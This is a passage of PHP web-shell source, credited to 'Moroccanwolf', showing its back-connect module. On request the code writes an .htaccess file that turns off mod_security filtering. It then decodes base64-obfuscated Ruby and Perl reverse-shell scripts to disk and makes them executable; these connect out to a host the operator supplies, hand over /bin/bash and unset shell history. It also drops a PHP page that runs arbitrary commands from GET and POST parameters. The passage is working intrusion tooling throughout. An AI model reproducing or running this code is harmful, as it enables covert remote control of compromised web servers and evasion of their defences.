    }  
}  

function cln_arr($array){  
    return @array_filter(@array_unique($array));  
}  

function wp_site($site){  
    return (eregi("wp-content",$site) or eregi("page_id=",$site)) ? str_replace("?","",preg_replace("#(.*?)/(\?page_id=|wp-content)(.*)#","$1",$site)):false;  
}


echo '<br><br><br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>';
}



if (isset($_GET['bcon'])){
echo '<br>
<b class="mekki" align="center">
<a href="?bcon=smp">Simple Back Connect</a><br><br>
<a href="?bcon=per">Perl Back Connect</a><br><br>
<a href="?bcon=rub">Ruby Back Connect</a><br><br>
<a href="?bcon=pyt">Python Back Connect</a><br><br>';


if(isset($_GET['bcon']) && $_GET['bcon'] == "rub"){


@mkdir('bconruby', 0755);
@chdir('bconruby');

$nnnn = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>"; 


$bbnn = fopen (".htaccess" , 'w+') or die ("Problem nihahahahahahahahaha !");
   
fwrite ( $bbnn , $nnnn ) ;
fclose ($bbnn);
//back connect ruby
$lalala = 'cmVxdWlyZSAnc29ja2V0Jw0KcmVxdWlyZSAncGF0aG5hbWUnDQogDQpkZWYgdXNhZ2UNCiAgICAgICAgcHJpbnQgImJpbmQgOlxyXG4gIHJ1YnkgIiArIEZpbGUuYmFzZW5hbWUoX19GSUxFX18pICsgIiBbcG9ydF1cclxuIg0KICAgICAgICBwcmludCAicmV2ZXJzZSA6XHJcbiAgcnVieSAiICsgRmlsZS5iYXNlbmFtZShfX0ZJTEVfXykgKyAiIFtwb3J0XSBbaG9zdF1cclxuIg0KZW5kDQogDQpkZWYgc3Vja3MNCiAgICAgICAgc3Vja3MgPSBmYWxzZQ0KICAgICAgICBpZiBSVUJZX1BMQVRGT1JNLmRvd25jYXNlLm1hdGNoKCdtc3dpbnx3aW58bWluZ3cnKQ0KICAgICAgICAgICAgICAgIHN1Y2tzID0gdHJ1ZQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHN1Y2tzDQplbmQNCiANCmRlZiByZWFscGF0aChzdHIpDQogICAgICAgIHJlYWwgPSBzdHINCiAgICAgICAgaWYgRmlsZS5leGlzdHM/KHN0cikNCiAgICAgICAgICAgICAgICBkID0gUGF0aG5hbWUubmV3KHN0cikNCiAgICAgICAgICAgICAgICByZWFsID0gZC5yZWFscGF0aC50b19zDQogICAgICAgIGVuZA0KICAgICAgICBpZiBzdWNrcw0KICAgICAgICAgICAgICAgIHJlYWwgPSByZWFsLmdzdWIoL1wvLywiXFwiKQ0KICAgICAgICBlbmQNCiAgICAgICAgcmV0dXJuIHJlYWwNCmVuZA0KIA0KaWYgQVJHVi5sZW5ndGggPT0gMQ0KICAgICAgICBpZiBBUkdWWzBdID1+IC9eWzAtOV17MSw1fSQvDQogICAgICAgICAgICAgICAgcG9ydCA9IEludGVnZXIoQVJHVlswXSkNCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzZXJ2ZXIgPSBUQ1BTZXJ2ZXIubmV3KCIiLCBwb3J0KQ0KICAgICAgICBzID0gc2VydmVyLmFjY2VwdA0KICAgICAgICBwb3J0ID0gcy5wZWVyYWRkclsxXQ0KICAgICAgICBuYW1lID0gcy5wZWVyYWRkclsyXQ0KICAgICAgICBzLnByaW50ICIqKiogY29ubmVjdGVkXHJcbiINCiAgICAgICAgcHV0cyAiKioqIGNvbm5lY3RlZCA6ICN7bmFtZX06I3twb3J0fVxyXG4iDQogICAgICAgIGJlZ2luDQogICAgICAgICAgICAgICAgaWYgbm90IHN1Y2tzDQogICAgICAgICAgICAgICAgICAgICAgICBmID0gcy50b19pDQogICAgICAgICAgICAgICAgICAgICAgICBleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgXDxcJiVkIFw+XCYlZCAyXD5cJiVkIixmLGYsZikNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGxpbmUgPSBzLmdldHMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgZXJyb3JCcm8gaWYgbGluZSA9fiAvXmRpZVxyrbQvDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBsaW5lLmNob21wID09ICIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGluZSA9fiAvY2QgLiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGluZSA9IGxpbmUuZ3N1YigvY2QgL2ksICcnKS5jaG9tcA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSByZWFscGF0aChsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzaWYgbGluZSA9fiAvXHc6LiovaQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgRmlsZS5kaXJlY3Rvcnk/KGxpbmUuY2hvbXApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpci5jaGRpcihsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzLnByaW50ICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBJTy5wb3BlbihsaW5lLCJyIil7fGlvfHMucHJpbnQgaW8ucmVhZCArICJcclxuIiArIHJlYWxwYXRoKCIuIikgKyAiPiJ9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgIHJlc2N1ZSBlcnJvckJybw0KICAgICAgICAgICAgICAgIHB1dHMgIioqKiAje25hbWV9OiN7cG9ydH0gZGlzY29ubmVjdGVkIg0KICAgICAgICBlbnN1cmUNCiAgICAgICAgICAgICAgICBzLmNsb3NlDQogICAgICAgICAgICAgICAgcyA9IG5pbA0KICAgICAgICBlbmQNCmVsc2lmIEFSR1YubGVuZ3RoID09IDINCiAgICAgICAgaWYgQVJHVlswXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMF0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMV0NCiAgICAgICAgZWxzaWYgQVJHVlsxXSA9fiAvXlswLTldezEsNX0kLw0KICAgICAgICAgICAgICAgIHBvcnQgPSBJbnRlZ2VyKEFSR1ZbMV0pDQogICAgICAgICAgICAgICAgaG9zdCA9IEFSR1ZbMF0NCiAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgIHVzYWdlDQogICAgICAgICAgICAgICAgcHJpbnQgIlxyXG4qKiogZXJyb3IgOiBQbGVhc2UgaW5wdXQgYSB2YWxpZCBwb3J0XHJcbiINCiAgICAgICAgICAgICAgICBleGl0DQogICAgICAgIGVuZA0KICAgICAgICBzID0gVENQU29ja2V0Lm5ldygiI3tob3N0fSIsIHBvcnQpDQogICAgICAgIHBvcnQgPSBzLnBlZXJhZGRyWzFdDQogICAgICAgIG5hbWUgPSBzLnBlZXJhZGRyWzJdDQogICAgICAgIHMucHJpbnQgIioqKiBjb25uZWN0ZWRcclxuIg0KICAgICAgICBwdXRzICIqKiogY29ubmVjdGVkIDogI3tuYW1lfToje3BvcnR9Ig0KICAgICAgICBiZWdpbg0KICAgICAgICAgICAgICAgIGlmIG5vdCBzdWNrcw0KICAgICAgICAgICAgICAgICAgICAgICAgZiA9IHMudG9faQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIFw8XCYlZCBcPlwmJWQgMlw+XCYlZCIsIGYsIGYsIGYpDQogICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSBsaW5lID0gcy5nZXRzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhaXNlIGVycm9yQnJvIGlmIGxpbmUgPX4gL15kaWVccj8kLw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgbGluZS5jaG9tcCA9PSAiIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxpbmUgPX4gL2NkIC4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpbmUgPSBsaW5lLmdzdWIoL2NkIC9pLCAnJykuY2hvbXANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaW5lID0gcmVhbHBhdGgobGluZSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlyLmNoZGlyKGxpbmUpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHMucHJpbnQgIlxyXG4iICsgcmVhbHBhdGgoIi4iKSArICI+Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2lmIGxpbmUgPX4gL1x3Oi4qL2kNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEZpbGUuZGlyZWN0b3J5rbhsaW5lLmNob21wKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXIuY2hkaXIobGluZS5jaG9tcCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcy5wcmludCAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4iDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSU8ucG9wZW4obGluZSwiciIpe3xpb3xzLnByaW50IGlvLnJlYWQgKyAiXHJcbiIgKyByZWFscGF0aCgiLiIpICsgIj4ifQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICByZXNjdWUgZXJyb3JCcm8NCiAgICAgICAgICAgICAgICBwdXRzICIqKiogI3tuYW1lfToje3BvcnR9IGRpc2Nvbm5lY3RlZCINCiAgICAgICAgZW5zdXJlDQogICAgICAgICAgICAgICAgcy5jbG9zZQ0KICAgICAgICAgICAgICAgIHMgPSBuaWwNCiAgICAgICAgZW5kDQplbHNlDQogICAgICAgIHVzYWdlDQogICAgICAgIGV4aXQNCmVuZA==';

$kk = fopen("bconruby.rb" ,"w+");
$write = fwrite ($kk ,base64_decode($lalala));
fclose($kk);

@chmod("bconruby.rb",0755);




$kkk ="
PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48aDM+Q29tbWFuZDogcnVieSBiY29ucnVieS5yYiBbaXBdIFtQb3J0XTwvaDM+PC9zdHJvbmc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9kPg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImtrayIgdmFsdWU9IkV4ZWN1dGUiPg0KPC9wPjwvZm9ybT4nOw0KDQo/Pg==";



$file = fopen("mwolf.php" ,"w+");
$write = fwrite ($file ,base64_decode($kkk));
fclose($file);
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900"><h6>Ruby Back-Connect</h6></span><center><center><br><iframe src=bconruby/mwolf.php width=75% height=70% frameborder=0></iframe></div></center>'; }
elseif(isset($_GET['bcon']) && $_GET['bcon'] == "per"){
@mkdir('bconperl', 0755);
@chdir('bconperl');
$nnnn = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>"; 


$bbnn = fopen (".htaccess" , 'w+') or die ("Problem nihahahahahahahahaha !");
   
fwrite ( $bbnn , $nnnn ) ;
fclose ($bbnn);
//back connect perl
$lalala = 'dXNlIElPOjpTb2NrZXQ7DQokc3lzdGVtICA9ICcvYmluL2Jhc2gnOw0KJEFSR0M9QEFSR1Y7DQpwcmludCAiTW9yb2NjYW53b2xmIEJBQ0stQ09OTkVDVCBCQUNLRE9PUlxuXG4iOw0KaWYgKCRBUkdDIT0yKSB7DQogICBwcmludCAiVXNhZ2U6ICQwIFtIb3N0XSBbUG9ydF0gXG5cbiI7DQogICBkaWUgIkV4OiAkMCAxMjcuMC4wLjEgMjEyMSBcbiI7DQp9DQp1c2UgU29ja2V0Ow0KdXNlIEZpbGVIYW5kbGU7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0IDooXG4iOw0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdCA6KFxuIjsNCnByaW50ICJbKl0gUmVzb2x2aW5nIEhvc3ROYW1lXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0aW5nLi4uICRBUkdWWzBdIFxuIjsNCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGwgXG4iOw0KcHJpbnQgIlsqXSBDb25uZWN0ZWQgdG8gcmVtb3RlIGhvc3QgXCEvIFxuIjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7DQpwcmludCAiQW5vbkdob3N0IEJBQ0stQ09OTkVDVCBCQUNLRE9PUiAgXG5cbiI7DQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVDtlY2hvIC0tPT1TeXN0ZW1pbmZvPT0tLTsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLTsgaWQ7ZWNobztlY2hvIC0tPT1EaXJlY3Rvcnk9PS0tOyBwd2Q7ZWNobzsgZWNobyAtLT09U2hlbGw9PS0tICIpOw0Kc3lzdGVtKCRzeXN0ZW0pOw==';
$kk = fopen("bconperl.pl" ,"w+");
$write = fwrite ($kk ,base64_decode($lalala));
fclose($kk);

@chmod("bconperl.pl",0755);




$kkk ="
PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48aDM+Q29tbWFuZDogcGVybCBiY29ucGVybC5wbCBbaXBdIFtQb3J0XTwvaDM+PC9zdHJvbmc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9k